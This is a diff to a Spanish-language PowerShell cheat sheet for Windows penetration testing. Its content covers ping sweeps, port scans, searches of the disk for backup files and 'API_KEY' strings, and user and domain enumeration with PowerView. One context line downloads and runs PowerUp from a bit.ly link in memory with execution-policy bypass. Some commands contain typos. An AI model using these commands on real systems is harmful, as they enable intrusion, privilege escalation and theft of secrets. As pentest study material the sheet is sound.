@@ -10,8 +10,9 @@ C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Inv
 # oneLiner para hacer un ping sweep
 1..15 | %{echo "10.0.0.$_"; ping -n2 10.0.0.$_ | Select-String ttl}
 
-# oneLiner para hacer un escaneo de puertos via sockets tcp
+# oneLiner para hacer un escaneo de puertos
 1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.0.$_")) "Puerto Abierto: $_"} 2>$null
+for ($i=130; $i -le 140; $i++){Test-NetConnection localhost -Port $i}
 
 # Descargar + ejecutar sin tocar el disco
 C:\> powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
@@ -76,6 +77,15 @@ Get-HotFix | Format-list | findstr 'InstalledOn'
 Get-HotFix | Format-list | findstr /C:'HotFixID' /C:'InstalledOn' # multiples busquedas
 (Get-NetUser).name # filtra solo el criterio "name"
 
+# busqueda de archivos/texto
+Get-ChildItem -Path C:\ -Filter 'interesting-file*' -Recurse
+Get-ChildItem -Path C:\ -Filter *.bak* -Recurse
+Get-ChildItem -Path C:\ -recurse | Select-String -Pattern 'API_KEY'
+
+# b64 Decoding
+certutil -decode "C:\Users\Administrator\Desktop\b64.txt" out.txt 
+$file = ".\b64.txt"; $data = Get-Content $file; [System.Text.Encoding]::Ascii.GetString([System.Convert]::FromBase64String($data))
+
 systeminfo
 net localgroup Administrators --> lista los miembros del grupo Administrators
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --> consulta los programas en autorun
@@ -85,7 +95,12 @@ icacls.exe c:\\windows\system32\SecurityHealthSystray.exe --> muestra los permis
 # PowerView
 Import-Module powerview.ps1	
 
+# Muestra el propietario de un archivo/carpeta
+get-acl C:\
+
 # Lista los usuarios y filtra por nombre o descripción
+Get-Localuser
+Get-Localuser -SID 'sid'
 (Get-NetUser).description
 (Get-NetUser).name
 	
@@ -100,4 +115,14 @@ Find-DomainShare -CheckShareAccess
 
 # Enumera GPOs
 Get-NetGPO
+
+# Lista ip address
+Get-NetIPAdress
+ifconfig
+
+# Lista puertos en "escucha"
+Get-NetTCPConnection -State Listen | measure
+
+# Buscar puertos abiertos
+Test-NetConnection -ComputerName localhost -Port 443
 
